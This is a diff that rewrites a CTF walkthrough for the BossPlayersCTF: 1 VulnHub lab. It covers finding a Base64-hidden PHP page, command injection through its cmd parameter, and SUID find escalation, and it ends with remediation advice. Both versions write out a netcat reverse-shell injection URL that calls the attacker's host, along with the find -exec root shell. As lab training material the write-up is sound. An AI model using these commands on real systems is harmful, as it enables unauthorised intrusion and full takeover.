@@ -1,121 +1,168 @@
-# bossplayersCTF: 1 — Writeup
+# BossPlayersCTF: 1 — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.1.107 (host-only) |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.1.107 |
 | **Difficulty** | Easy |
-| **OS** | Linux (Debian, Apache2, PHP) |
-| **Author** | Cuong Nguyen |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/bossplayersctf-1,375/) |
+| **OS** | Linux (Debian) |
+| **Goal** | root flag |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/bossplayersctf-1-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-Page source → multi-layer Base64 hidden path → `workinginprogress.php?cmd=` command injection → netcat reverse shell → SUID `find` → root
+BossPlayersCTF: 1 is a beginner Linux challenge built around multi-layer Base64 encoding to hide a hidden PHP page, followed by command injection through a `cmd` GET parameter, and privilege escalation via SUID `find`.
 
 ## Methodology
 
-1. Network discovery and port scan
-2. Page source analysis (hidden Base64-encoded path)
-3. Command injection via `cmd` parameter
-4. Reverse shell upgrade
-5. SUID `find` privilege escalation
+1. Host discovery with netdiscover
+2. Port scan with nmap — HTTP (80) and SSH (22)
+3. Web source and robots.txt enumeration
+4. Multi-layer Base64 decoding to find hidden page
+5. Command injection via GET parameter
+6. Reverse shell via netcat
+7. SUID `find` privilege escalation
 
----
+## Step 1: Reconnaissance
 
-## Step 1: Network Discovery
+### Host Discovery
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.1.0/24
+netdiscover -r 192.168.1.0/24
+```
+
+Target at **192.168.1.107**.
+
+### Port Scan
+
+```bash
 nmap -A 192.168.1.107
 ```
 
-Ports open: 22 (SSH), 80 (HTTP / Rocket httpd)
+![nmap](images/01-nmap.png)
 
-![Nmap results](images/01-nmap.png)
+| Port | Service |
+|---|---|
+| 22/tcp | OpenSSH |
+| 80/tcp | Rocket httpd |
 
----
+## Step 2: Web Enumeration
 
-## Step 2: Hidden Path via Multi-Layer Base64
-
-Browse to `http://192.168.1.107/` and view page source. A commented Base64 string is embedded:
+### Directory Brute-Force
 
 ```bash
-echo "VGhpcyBpcyBhIHNlY3JldCBtZXNzYWdlCg==" | base64 -d
-# Repeat decoding layers until output is: workinginprogress.php
+dirb http://192.168.1.107/
 ```
 
-![Base64 decode chain](images/02-base64-decode.png)
+`robots.txt` discovered. Its contents decode to a troll message — rabbit hole.
 
----
+### View Page Source
 
-## Step 3: Command Injection
+Open `http://192.168.1.107/` in a browser and view source. An HTML comment contains a Base64-encoded string.
 
-Browse to `http://192.168.1.107/workinginprogress.php?cmd=id` to confirm RCE:
+![Web Source](images/02-web-source.png)
 
+## Step 3: Multi-Layer Base64 Decoding
+
+Decode the comment string through three rounds of Base64:
+
+```bash
+# Round 1
+echo "WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK" | base64 -d
+# Output: ZDI5eWEybHVaMmx1Y0hKdlozSmxjM011Y0dod0NnPT0K
+
+# Round 2
+echo "ZDI5eWEybHVaMmx1Y0hKdlozSmxjM011Y0dod0NnPT0K" | base64 -d
+# Output: d29ya2luZ2lucHJvZ3Jlc3MucGhwCg==
+
+# Round 3
+echo "d29ya2luZ2lucHJvZ3Jlc3MucGhwCg==" | base64 -d
+# Output: workinginprogress.php
 ```
-http://192.168.1.107/workinginprogress.php?cmd=id
-# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+![Base64 Decode](images/03-base64-decode.png)
+
+Hidden page found: `http://192.168.1.107/workinginprogress.php`
+
+This page lists installed software (Debian, Apache2, PHP) and shows two incomplete items: "test the ping command" and "fix privilege escalation" — hinting at both the attack vectors.
+
+## Step 4: Command Injection
+
+Test the `cmd` GET parameter:
+
+```bash
+# Confirm injection
+curl "http://192.168.1.107/workinginprogress.php?cmd=id"
+# Expected output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-The `cmd` parameter passes user input directly to the system shell (`ping`-style feature).
+Command injection confirmed as `www-data`.
 
-![Command injection confirmed](images/03-cmd-injection.png)
+## Step 5: Reverse Shell
 
----
-
-## Step 4: Reverse Shell
-
-Start a listener:
+Set up a listener on the attacker machine:
 
 ```bash
 nc -lvp 1234
 ```
 
-Trigger the shell via the `cmd` parameter:
+Trigger the reverse shell via the injection point:
 
 ```
-http://192.168.1.107/workinginprogress.php?cmd=nc%20-e%20/bin/bash%20192.168.1.105%201234
+http://192.168.1.107/workinginprogress.php?cmd=nc+-e+/bin/bash+192.168.1.105+1234
 ```
 
-Upgrade the shell:
+![RCE Shell](images/04-rce-shell.png)
+
+Stabilize the shell:
 
 ```bash
 python -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
-![Reverse shell](images/04-reverse-shell.png)
+## Step 6: Privilege Escalation — SUID find
 
----
-
-## Step 5: Privilege Escalation — SUID find
+Enumerate SUID binaries:
 
 ```bash
 find / -perm -u=s -type f 2>/dev/null
-# /usr/bin/find has SUID set
-
-find . -exec /bin/sh -p \; -quit
-id
-# uid=0(root)
-
-cd /root && cat root.txt
 ```
 
-The flag in `/root/root.txt` is Base64-encoded — decode it to read the congratulations message.
+The `find` binary has SUID set. Escalate using GTFOBins technique:
 
-![Root shell](images/05-root.png)
+```bash
+find . -exec /bin/sh -p \; -quit
 
----
+# Confirm
+id
+# uid=33(www-data) gid=33(www-data) euid=0(root)
+```
+
+## Step 7: Root Flag
+
+```bash
+cd /root
+ls
+cat root.txt
+```
+
+The flag content is Base64-encoded. Decode it:
+
+```bash
+cat root.txt | base64 -d
+```
+
+![Root Flag](images/05-root-flag.png)
 
 ## Lessons Learned
 
-1. **Hidden content in page source** — always view source and look for comments; Base64 strings are a common CTF hiding technique
-2. **Unsanitized `cmd` parameter** — passing GET parameters directly to shell functions is critical RCE; use `escapeshellcmd()` or avoid shell calls entirely
-3. **SUID on system binaries** — `find` with SUID allows trivial root escalation via `-exec`; GTFOBins documents dozens of these
+- Obfuscating paths with Base64 in HTML comments provides no real security.
+- A `cmd` GET parameter that passes input to a system command is a critical RCE vulnerability.
+- SUID `find` is a well-known GTFOBins escalation path — never set SUID on standard utilities.
 
 ## Remediation
 
 | Vulnerability | Fix |
 |---|---|
-| Command injection in `cmd` parameter | Sanitize input; avoid system() calls; use parameterized alternatives |
-| SUID on `/usr/bin/find` | Remove SUID: `chmod u-s /usr/bin/find` |
-| Secrets in page source comments | Never embed encoded paths or credentials in HTML |
+| Hidden path in HTML comments | Remove development artifacts before deploying to production |
+| Command injection via `cmd` parameter | Validate and sanitize all user input; avoid `system()` / `exec()` with user data |
+| SUID `find` binary | Remove SUID bit: `chmod u-s /usr/bin/find` |
